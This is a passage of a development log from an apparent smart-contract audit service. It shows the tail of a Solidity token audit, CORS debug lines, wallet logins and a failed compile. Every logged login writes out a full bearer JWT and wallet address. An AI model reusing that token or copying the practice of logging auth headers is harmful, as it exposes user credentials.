- **No math errors:** Solidity 0.8.0 has built-in overflow/underflow checks, so balance subtraction and addition are safe.  
- **No ETH or funds held:** The contract has zero ETH balance and does not accept or hold ETH. It only manages token balances internally.  
- **No backdoors or hidden logic:** The code is straightforward with no suspicious or hidden code paths.  
- **Economic or logic exploits:** Since the contract does not implement allowance or minting/burning, no inflation or double-spend issues are present. However, the lack of events means token transfers are not easily trackable by off-chain tools, which could be considered a usability flaw but not a security vulnerability.

3.
2025-07-06 09:24:19,161 - services.contract_service - INFO - Analysis completed with status: KO
2025-07-06 09:24:19,163 - services.contract_service - INFO - Temporary file /tmp/tmp96szjclk.sol removed
2025-07-06 09:24:19,340 - api.contract - INFO - Report saved with filename: HelloToken_2025-07-06_09-24, status: KO
2025-07-06 09:24:19,343 - api.contract - INFO - Analysis completed successfully, returning report
2025-07-06 09:24:19,345 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:24:19,347 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:24:19,348 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:24:19,350 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 09:24:21,105 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:24:21,109 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:24:21,111 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:24:21,114 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-06 09:24:21,170 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 09:24:21,173 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 09:24:21,175 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 09:24:21,177 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 13:24:03,893 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-07-06 13:24:04,379 - app - INFO - Application started
2025-07-06 13:24:04,400 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 13:24:04,402 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 13:24:04,405 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 13:24:04,408 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-06 13:24:04,420 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 13:24:04,422 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 13:24:04,426 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 13:24:04,429 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-06 13:24:04,440 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 13:24:04,443 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 13:24:04,446 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 13:24:04,448 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-06 13:24:04,455 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 13:24:04,458 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 13:24:04,459 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 13:24:04,461 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-06 13:24:04,471 - api.auth - INFO - Received login request with method: POST
2025-07-06 13:24:04,474 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3OTczOTV9.B7HVvDOpdC1daCdMSoZZcKz8k2fK9jdljiuGF4VIsAY', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-06 13:24:04,475 - api.auth - INFO - Request content type: application/json
2025-07-06 13:24:04,476 - api.auth - INFO - Processing JSON request
2025-07-06 13:24:04,479 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 13:24:05,073 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 13:24:05,079 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 13:24:05,081 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 13:24:05,084 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 13:24:05,085 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 13:24:05,091 - api.auth - INFO - Received login request with method: POST
2025-07-06 13:24:05,093 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3OTczOTV9.B7HVvDOpdC1daCdMSoZZcKz8k2fK9jdljiuGF4VIsAY', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-06 13:24:05,095 - api.auth - INFO - Request content type: application/json
2025-07-06 13:24:05,096 - api.auth - INFO - Processing JSON request
2025-07-06 13:24:05,100 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 13:24:05,650 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 13:24:05,658 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 13:24:05,661 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 13:24:05,663 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 13:24:05,665 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 13:24:05,673 - api.auth - INFO - Received login request with method: POST
2025-07-06 13:24:05,678 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3OTczOTV9.B7HVvDOpdC1daCdMSoZZcKz8k2fK9jdljiuGF4VIsAY', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-06 13:24:05,682 - api.auth - INFO - Request content type: application/json
2025-07-06 13:24:05,685 - api.auth - INFO - Processing JSON request
2025-07-06 13:24:05,686 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 13:24:06,246 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 13:24:06,251 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 13:24:06,255 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 13:24:06,258 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 13:24:06,263 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 13:24:06,271 - api.auth - INFO - Received login request with method: POST
2025-07-06 13:24:06,274 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3OTczOTV9.B7HVvDOpdC1daCdMSoZZcKz8k2fK9jdljiuGF4VIsAY', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-06 13:24:06,277 - api.auth - INFO - Request content type: application/json
2025-07-06 13:24:06,281 - api.auth - INFO - Processing JSON request
2025-07-06 13:24:06,286 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 13:24:06,864 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 13:24:06,867 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 13:24:06,869 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 13:24:06,871 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 13:24:06,872 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 13:24:21,224 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 13:24:21,235 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 13:24:21,238 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 13:24:21,242 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-06 13:24:21,263 - api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 13:24:21,274 - api.contract - INFO - Analyzing code snippet
2025-07-06 13:24:21,290 - api.contract - INFO - Starting contract analysis for user: 1
2025-07-06 13:24:21,296 - services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpsyxaep8m.sol
2025-07-06 13:24:21,308 - services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-06 13:24:21,310 - services.contract_service - INFO - Compiling contract...
2025-07-06 13:24:21,326 - solcx - INFO - Using solc version 0.8.20
2025-07-06 13:24:22,103 - services.contract_service - INFO - Compilation result: 0 contracts compiled
2025-07-06 13:24:22,105 - services.contract_service - WARNING - No contracts compiled
2025-07-06 13:24:22,106 - services.contract_service - INFO - Temporary file /tmp/tmpsyxaep8m.sol removed
2025-07-06 13:24:22,108 - api.contract - WARNING - No valid Solidity contract found in the provided code
2025-07-06 13:24:22,110 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 13:24:22,112 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 13:24:22,114 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 13:24:22,116 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 13:30:48,636 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-07-06 13:30:48,885 - app - INFO - Application started
2025-07-06 13:30:48,895 - api.auth - INFO - Received login request with method: POST
